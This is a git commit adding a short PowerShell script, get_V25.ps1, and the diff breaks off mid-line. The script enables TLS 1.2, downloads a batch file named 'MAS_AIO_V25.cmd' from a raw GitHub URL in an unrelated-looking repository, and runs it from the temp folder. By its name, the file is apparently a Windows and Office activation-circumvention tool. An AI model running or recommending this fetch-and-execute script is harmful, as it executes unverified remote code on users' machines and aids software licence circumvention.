05fab88859f0b7990ce0836b6f4960dc6e8bbced
Hai Tran Ngoc <tranngochailab@gmail.com>
2025-12-26 00:01:17 -0800

    Add files via upload

---
+++ get_V25.ps1
@@ -0,0 +1,18 @@
+# Enable TLSv1.2 for compatibility with older clients
+[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor [System.Net.SecurityProtocolType]::Tls12
+
+$DownloadURL = 'https://raw.githubusercontent.com/hagychen/APIVOKE/refs/heads/main/MAS_AIO_V25.cmd'
+
+$FilePath = "$env:TEMP\MAS_AIO_V25.cmd"
+
+try {
+    Invoke-WebRequest -Uri $DownloadURL -UseBasicParsing -OutFile $FilePath
+} catch {
+    Write-Error $_
+	Return
+}
+
+if (Test-Path $FilePath) {
+    Start-Process $FilePath -Wait
+    $item = Get-Item -LiteralPath $FilePath
+    $item.D
